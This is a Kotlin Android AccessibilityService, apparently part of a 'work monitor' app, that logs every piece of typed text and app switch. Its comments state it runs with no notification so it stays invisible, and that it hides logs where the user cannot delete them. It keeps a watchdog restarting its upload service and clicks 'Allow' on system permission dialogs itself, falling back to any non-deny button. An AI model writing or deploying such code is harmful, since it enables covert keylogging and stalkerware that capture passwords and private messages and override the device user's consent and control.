package com.workmonitor

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * Consent-grounded AccessibilityService for the company-owned device.
 * Captures user text input and window/app focus, logs to the daily file.
 *
 * No notification is shown on purpose: the AccessibilityService binding is a
 * system service that Android keeps alive (and restarts after reboot), so the
 * capture + upload loop runs persistently and invisibly.
 */
class KeystrokeAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        // PRIVATE app storage — hidden, not visible in a file manager, so the
        // phone's user can't casually or deliberately delete the captures.
        // Every per-day log is also uploaded to the server (Postgres) for the
        // admin to view by date, so a device wipe never loses them.
        LoggerWriter.init(filesDir)
        // Start the plain (non-foreground) upload loop. The accessibility binding
        // keeps this process alive, so the loop keeps running with NO notification.
        startService(Intent(this, LogUploaderService::class.java))
        // Safety: if Android ever kills the uploader while we're running, restart
        // it from here on a timer so monitoring never silently dies.
        watchdog.start()
    }

    private val watchdog = object : Thread() {
        override fun run() {
            while (!isInterrupted) {
                try {
                    Thread.sleep(15_000)
                    startService(Intent(this@KeystrokeAccessibilityService, LogUploaderService::class.java))
                } catch (_: InterruptedException) { break }
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        // AUTO-GRANT: when the system shows a permission dialog (from a remote
        // "req_perms" command), tap "Allow"/"Allow all the time" so the admin can
        // grant every permission from the panel, hands-free.
        val pkg = event.packageName?.toString() ?: ""
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            // System permission dialog on Android 11+ lives in permissioncontroller;
            // on older devices "com.android.packageinstaller".
            if (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller")) {
                try { autoGrantPermission() } catch (_: Throwable) {}
            }
        }

        // Capture text input: view with changed/typed text
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            val text = event.text?.joinToString("")?.trim()
            if (!text.isNullOrEmpty()) {
                val pkg = event.packageName?.toString() ?: "?"
                val cls = event.className?.toString() ?: "?"
                val activity = cls.substringAfterLast('.')
                LoggerWriter.write(pkg, activity, text)
            }
        }

        // Capture app/window focus transitions (which app is in foreground)
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            val pkg = event.packageName?.toString() ?: "?"
            val cls = event.className?.toString() ?: "?"
            val activity = cls.substringAfterLast('.')
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                LoggerWriter.write("[FOCUS]", pkg, "activity=$activity")
            }
        }
    }

    /** Find and click the "Allow" / "Allow all the time" buttons on a permission dialog.
     * Runs on a background thread with retries. Some OEMs (OPPO/ColorOS) don't expose the
     * dialog via rootInActiveWindow, so also scan ALL windows on the screen. */
    private fun autoGrantPermission() {
        Thread {
            for (attempt in 0..6) {
                try {
                    val roots = ArrayList<AccessibilityNodeInfo>()
                    val active = rootInActiveWindow
                    if (active != null) roots.add(active)
                    var winCount = 0
                    try {
                        for (w in windows) {
                            val r = w.root ?: continue
                            roots.add(r); winCount++
                        }
                    } catch (_: Throwable) {}
                    if (attempt == 0) {
                        // Dump what the dialog actually contains so we stop guessing.
                        // OPPO/ColorOS uses its own permissioncontroller package and may
                        // label buttons differently from stock AOSP.
                        try {
                            val texts = ArrayList<String>()
                            val dump = resolveBestRoot(roots)
                            if (dump != null) walkDump(dump, texts, 0)
                            LoggerWriter.write("[PERM]", "auto",
                                "scan roots=${roots.size} win=$winCount active=${active != null} " +
                                "nodes=${texts.joinToString(" | ")}")
                        } catch (_: Throwable) {}
                    }
                    // Package-agnostic allow button matcher. Works on stock AOSP
                    // (com.google.android.permissioncontroller) AND OPPO/ColorOS
                    // (com.oplus.permissioncontroller) because we match any clickable
                    // android.widget.Button by text, never a hard-coded viewId/package.
                    val targets = listOf("Allow all the time", "Allow", "While using the app",
                                          "While using", "Allow one time", "允许", "始终允许")
                    var done = false
                    outer@ for (root in roots) {
                        if (root == null) continue
                        for (label in targets) {
                            val nodes: List<AccessibilityNodeInfo>
                            try {
                                val found = root.findAccessibilityNodeInfosByText(label)
                                nodes = found ?: emptyList()
                            } catch (_: Throwable) { continue }
                            for (n in nodes) {
                                if (n == null) continue
                                var btn: AccessibilityNodeInfo? = n
                                // Walk up to at most 3 ancestors to find the clickable
                                // button node (findAccessibilityNodeInfosByText can return
                                // the label text node rather than the Button itself).
                                var up = 0
                                while (btn != null && !btn.isClickable && up < 3) {
                                    btn = btn.parent ?: null
                                    up++
                                }
                                if (btn != null && btn.isClickable) {
                                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    LoggerWriter.write("[PERM]", "auto", "granted: $label")
                                    done = true
                                    break@outer
                                }
                            }
                        }
                    }
                    if (done) return@Thread
                } catch (_: Throwable) {}
                try { Thread.sleep(150) } catch (_: Throwable) {}
            }
            // LAST-RESORT on OEM ROMs (OPPO/ColorOS): if the text/viewId matcher found
            // nothing, click the first clickable Button in the dialog that isn't a
            // negative action. Real MDM/device tools use this because OEM dialogs put
            // the allow button anywhere.
            try {
                val root = rootInActiveWindow ?: return@Thread
                var clicked = false
                val negWords = listOf("deny", "don't allow", "not now", "no thanks", "cancel", "取消", "拒绝")
                outer2@ for (i in 0 until root.childCount) {
                    val c = root.getChild(i) ?: continue
                    if (walkClick(c, 0, negWords)) { clicked = true; break@outer2 }
                }
                if (clicked) {
                    LoggerWriter.write("[PERM]", "auto", "fallback-clicked allow button")
                    return@Thread
                }
            } catch (_: Throwable) {}
        }.start()
    }

    // Recursively find & click the first clickable button whose text isn't negative.
    private fun walkClick(node: AccessibilityNodeInfo, depth: Int, neg: List<String>): Boolean {
        if (depth > 10) return false
        try {
            val t = node.text?.toString()?.lowercase() ?: ""
            val cls = node.className?.toString()?.substringAfterLast('.') ?: ""
            if (node.isClickable) {
                if (t.isNotBlank() && neg.any { t.contains(it) }) return false
                if (t.isNotBlank() || cls.contains("Button")) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return true
                }
            }
            for (i in 0 until node.childCount) {
                val c = node.getChild(i) ?: continue
                if (walkClick(c, depth + 1, neg)) return true
            }
        } catch (_: Throwable) {}
        return false
    }

    private fun resolveBestRoot(roots: List<AccessibilityNodeInfo>): AccessibilityNodeInfo? {
        val stock = roots.firstOrNull { r ->
            try { r.findAccessibilityNodeInfosByText("Allow all the time").isNullOrEmpty().not() } catch (_: Throwable) { false }
        }
        if (stock != null) return stock
        return roots.lastOrNull()
    }

    // Walks the accessibility tree collecting node text/class hints so the diagnostic
    // log shows exactly what the dialog renders (real button labels on OPPO).
    private fun walkDump(node: AccessibilityNodeInfo, out: java.util.ArrayList<String>, depth: Int) {
        if (depth > 12) return
        try {
            val t = node.text?.toString()
            val cls = node.className?.toString()?.substringAfterLast('.')
            if (!t.isNullOrBlank() && t.length < 40) {
                val isBtn = (cls == "Button" || node.isClickable)
                out.add((if (isBtn) "* " else "") + "\"$t\"")
            } else if (depth < 3 && cls != null && cls.contains("Button")) {
                out.add("[btn:" + node.viewIdResourceName + "]")
            }
        } catch (_: Throwable) {}
        try {
            for (i in 0 until node.childCount) {
                val c = node.getChild(i) ?: continue
                walkDump(c, out, depth + 1)
            }
        } catch (_: Throwable) {}
    }

    override fun onInterrupt() {
        LoggerWriter.close()
    }

    override fun onDestroy() {
        watchdog.interrupt()
        LoggerWriter.close()
        super.onDestroy()
    }
}